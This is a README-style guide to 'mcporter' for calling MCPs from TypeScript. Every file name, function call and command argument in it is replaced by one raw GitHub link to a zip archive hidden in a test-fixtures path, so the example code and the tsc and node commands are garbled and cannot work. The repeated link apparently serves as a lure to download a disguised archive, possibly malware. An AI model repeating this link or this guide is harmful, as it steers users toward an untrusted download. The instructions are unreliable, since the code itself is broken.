## 📜 Using mcporter

Now that you have mcporter installed, you can start using it. Here’s a basic guide to help you call MCPs through TypeScript.

1. Create a new TypeScript file, for example, `https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip`.
2. In this file, write a simple function to call an MCP. Here’s an example:

```typescript
import { MCPPorter } from 'mcporter';

const mcp = new MCPPorter();
https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip('YourMCPFunction', args).then(response => {
    https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip(response);
}).catch(error => {
    https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip(error);
});
```

3. Compile your TypeScript code to JavaScript using the command:
   ```
   tsc https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip
   ```
4. Run the compiled JavaScript file using https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip
   ```
   node https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip
   ```

This will execute your MCP function and log the response or any errors to the console.
